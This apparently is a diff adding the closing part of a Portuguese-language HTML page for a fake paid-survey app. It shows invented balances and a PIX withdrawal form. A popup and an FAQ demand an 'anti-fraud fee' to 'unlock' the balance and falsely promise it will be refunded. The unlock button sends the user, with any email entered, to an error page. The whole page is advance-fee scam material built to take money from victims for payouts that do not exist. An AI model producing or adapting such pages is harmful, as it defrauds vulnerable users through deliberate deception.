+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
+         </div>
+         <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p11" ---------------------->
+         <div class="white-box" id="ad11" style="display: none">
+         </div>
+         `
+         <!--------------------- Limite atingido --------------------->
+         <div class="popup-containerL" id="popupL">
+            <div id="container-progresso" style="display: flex; margin: 0 auto; width: 300px; height: 300px;">
+               <svg viewbox="0 0 36 36" id="barra-progresso-svg">
+                  <circle cx="18" cy="18" r="16" fill="none" stroke="#ccc" stroke-width="3"></circle>
+                  <circle cx="18" cy="18" r="16" fill="none" stroke="#06B32E" stroke-width="3" id="minha-barra-progresso" stroke-dasharray="0 1000"></circle>
+               </svg>
+               <div id="texto-progresso">
+                  <span id="valor-saque" style="font-family: 'Montserrat', sans-serif; font-size: 23px;">R$100.00</span>
+                  <span style="font-family: 'Montserrat', sans-serif; color: #202020; font-size: 14px;">Seu saldo subiu!</span>
+               </div>
+            </div>
+            <p style="font-family: 'Montserrat', sans-serif; font-size: 32px; color: #28a745; text-align: center; margin-top: 15px; margin-bottom: -5px;">Parabens!</p>
+            <p class="popup-textL" style="margin-bottom: 20px; font-size: 18px; color: #636363">Voce atingiu seu<br>limite diario!</p>
+            <button class="desbloquear-button" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;" href="#" onclick="mostrarPagina('saque')">SAQUE AGORA</button>
+         </div>
+         <!--------------------- Menu debaixo --------------------->
+         <div style="margin-bottom: 80px;"></div>
+         <div class="menuemb">
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
+            <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
+            <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">home</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
+            <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
+            </a>
+         </div>
+      </div>
+      <!--------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "Saque" --------------------->
+      <div id="saque" style="display: none;">
+         <div class="menu">
+            <a>
+            <img src="https://i.postimg.cc/TwFrwM8Y/ico-app.webp">
+            </a> 
+            <a></a>
+         </div>
+         <div style="margin-bottom: 100px;"></div>
+         <div class="outer-box">
+            <div class="valor-box-saque">
+               <p style="font-size: 16px; margin-bottom: 15px; text-align: center; color: rgb(101, 101, 101);">Seu saldo</p>
+               <span id="valor-money" style="font-size: 45px; text-align: center; font-family: 'Montserrat', sans-serif; letter-spacing: -2px; color: #06B32E;">R$ 67.00</span>
+            </div>
+         </div>
+         <p style="margin-bottom: 18px; margin-top: 23px; color: rgb(101, 101, 101); text-align: center; font-weight: bold;">Selecione seu tipo de chave PIX</p>
+         <div class="button-container">
+            <button class="square-button" onclick="toggleButton(1)">
+            <img decoding="async" src="images/cpf.png" alt="Botao 1">
+            </button>
+            <button class="square-button" onclick="toggleButton(2)">
+            <img decoding="async" src="images/telefone.png" alt="Botao 2">
+            </button>
+            <button class="square-button" onclick="toggleButton(3)">
+            <img decoding="async" src="images/email.png" alt="Botao 3">
+            </button>
+            <button class="square-button" onclick="toggleButton(4)">
+            <img decoding="async" src="images/qr.png" alt="Botao 4">
+            </button>
+         </div>
+         <div style="margin-bottom: 15px;"></div>
+         <!--------------------- MENU EMBAIXO --------------------->
+         <div class="menuemb">
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
+            <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">paid</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
+            <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
+            <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">help</span>
+            </a>
+         </div>
+         <input class="form-input" type="text" name="chave-pix" id="chave-pix" placeholder="Digite sua chave PIX aqui">
+         <input class="form-input" style="margin-top: 15px;" type="text" name="quantia" id="quantia" placeholder="Digite o valor que deseja sacar" inputmode="numeric" oninput="formatarValor(this)">
+         <button class="desbloquear-button" onclick="showPopup()" style="font-weight: bold; font-size: 18x; border-radius: 12px; margin-top: 15px;">REALIZAR SAQUE</button>
+         <!--------------------- TAXA DESBLOQUEIO --------------------->
+         <div class="popup-container" id="popup">
+            <script src="js/lottie-player.js"></script>
+            <lottie-player src="https://lottie.host/7c73a00c-afa8-4ad5-b6b7-d8050e57f0c3/pg6N0GhPE7.json" background="##ffffff" speed="1.25" style="width: 150px; height: 150px; margin: 0 auto; display: flex;" loop="" autoplay="" direction="1" mode="normal"></lottie-player>
+            <!--<span class="popup-text" style="font-size: 20px; font-weight: bold;">APRENDA A DESBLOQUEAR<br>SEU SALDO EM 1 MINUTO</span>--->
+            <span class="popup-text" style="font-size: 20px; font-weight: bold;">DESBLOQUEAR SEU SALDO</span>
+            <div style="margin-bottom: 20px;"></div>
+            <p class="popup-text" style="padding-left: 5%; padding-right: 5%; text-align: justify;">Usamos uma taxa anti-fraudes, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro do sistema.<br><br>Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu saque, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.</p>
+            <div style="margin-bottom: 20px;"></div>
+            <!-- Modifique o botão para usar a nova função -->
+            <button class="desbloquear-button" style="font-weight: bold;" onclick="abrirComParametros()">DESBLOQUEAR AGORA</button>
+            <!--<button class="desbloquear-button" style="font-weight: bold;" onclick="video();">VEJA COMO</button>--->
+         </div>
+         <div style="margin-bottom: 120px;"></div>
+         <!--------------------- VIDEO DESBLOQUEIO --------------------->
+         <!--<div class="popup-container" id="popupvideo">
+            <div style="width: 70%; height: 70%; display: flex; margin: 0 auto; border-radius: 12px; margin-bottom: 10px;">
+            
+              <div id="vid_6590e057fa276e0009498386" style="position:relative;width:100%;padding: 178.21782178217822% 0 0; margin-bottom: 10px; border-radius: 12px; display: flex; margin: 0 auto;"><img id="thumb_6590e057fa276e0009498386" src="https://images.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"><div id="backdrop_6590e057fa276e0009498386" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div></div><script type="text/javascript" id="scr_6590e057fa276e0009498386">var s=document.createElement("script");s.src="https://scripts.converteai.net/0b265e52-7b06-411f-b1b3-e2e5a9c23f78/players/6590e057fa276e0009498386/player.js",s.async=!0,document.head.appendChild(s);</script>
+            
+            </div>
+            
+            <button class="desbloquear-button" style="font-weight: bold;" onclick="window.open('./Meu Velho Rico/erro/', '_blank')">DESBLOQUEAR AGORA</button>
+            
+            </div>
+            
+            <div style="margin-bottom: 20px;"></div>--->
+      </div>
+      <!--------------------- Pagina bonus --------------------->
+      <div id="bonus" style="display: none;">
+         <!--------------------- Menu de cima --------------------->
+         <div class="menu">
+            <a>
+            <img src="https://i.postimg.cc/TwFrwM8Y/ico-app.webp">
+            </a> 
+            <a></a>
+         </div>
+         <div style="margin-bottom: 90px;"></div>
+         <div style="margin-bottom: 110px;"></div>
+         <p class="faq-title">Perguntas frequentes</p>
+         <div class="faq-container">
+            <div class="faq-item">
+               <div class="question" onclick="toggleAnswer(this)">Preciso pagar a taxa toda vez?</div>
+               <div class="answer">Nao! A taxa eseria paga somente a primeira vez, para confirmar que voce seria um humano, e nao um robo. Voce recebera o estorno do valor da taxa, apos o primeiro saque!</div>
+            </div>
+            <div class="faq-item">
+               <div class="question" onclick="toggleAnswer(this)">Por que existe a taxa?</div>
+               <div class="answer"> Serve como uma etapa anti-fraude, para evitar fraudes e abuso dos saques que estavam ocorrendo dentro da plataforma! Mas nao precisa se preocupar, voce recebera o valor da taxa de volta, junto ao valor do seu saque, seria apenas uma etapa de validamento de que voce e humano e nao um robo.</div>
+            </div>
+            <div class="faq-item">
+               <div class="question" onclick="toggleAnswer(this)">Em quanto tempo vou receber?</div>
+               <div class="answer">Voce recebera seu saque dentro de 24 horas, da mesma forma que voce receber seu saque teste!</div>
+            </div>
+            <div class="faq-item">
+               <div class="question" onclick="toggleAnswer(this)">Quantas vezes posso sacar por dia?</div>
+               <div class="answer">Quantas voce quiser, mas existe uma quantidade limitada de codigos que temos acesso por dia!</div>
+            </div>
+            <div class="faq-item">
+               <div class="question" onclick="toggleAnswer(this)">Como usa o aplicativo?</div>
+               <div class="answer">e muito simples de usar! Basta responder as simples perguntas sobre as empresas, no menu principal, e por fim, clicar no botao de "Enviar respostas", quando enviar, ja recebera seu dinheiro pela tarefa realizada!</div>
+            </div>
+         </div>
+         <div style="margin-bottom: 150px;"></div>
+         <!--------------------- Menu debaixo --------------------->
+         <div class="menuemb">
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "InÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â­cio" -->
+            <a href="#" onclick="mostrarPagina('saque')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">paid</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Pagina 2" -->
+            <a href="#" onclick="mostrarPagina('inicio')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: rgb(101, 101, 101);">home</span>
+            </a>
+            <!-- Chamando a funÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â§ao para mostrar "Saque" -->
+            <a href="#" onclick="mostrarPagina('bonus')">
+            <span class="material-symbols-outlined" style="text-align: center; width: 120%; margin: 15px; font-size: 40px; color: #06B32E;">help</span>
+            </a>
+         </div>
+      </div>
+      <!--------------------- Fim do body --------------------->
+      <script src="js/scripts.js"></script>
+      <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" rel="stylesheet">
+      <!-- Script Utms -->
+      <script>
+          function adicionarParametrosAosLinks() {
+              const urlParams = new URLSearchParams(window.location.search);
+
+              // Modificar os links <a> se houver
+              const links = document.querySelectorAll('a');
+              links.forEach(link => {
+                  const href = new URL(link.href);
+                  urlParams.forEach((value, key) => {
+                      href.searchParams.set(key, value);
+                  });
+                  link.href = href.toString();
+              });
+          }
+
+          // Função para redirecionar com parâmetros da URL atual e o e-mail preenchido
+          function abrirComParametros() {
+              const urlParams = new URLSearchParams(window.location.search);
+
+              // Captura o valor do campo de e-mail, se existir
+              const email = document.getElementById('email')?.value;
+              
+              // Adiciona o e-mail aos parâmetros da URL, caso esteja preenchido
+              if (email) {
+                  urlParams.set('email', email);
+              }
+
+              // Constrói a nova URL com os parâmetros
+              const novaUrl = '../erro/?' + urlParams.toString();
+              
+              // Abre a URL com os parâmetros em uma nova aba
+              window.open(novaUrl, '_blank');
+          }
+
+          // Chama a função ao carregar a página
+          document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+      </script>
+      <!-- Script Utms -->
+
+   </body>
+</html>
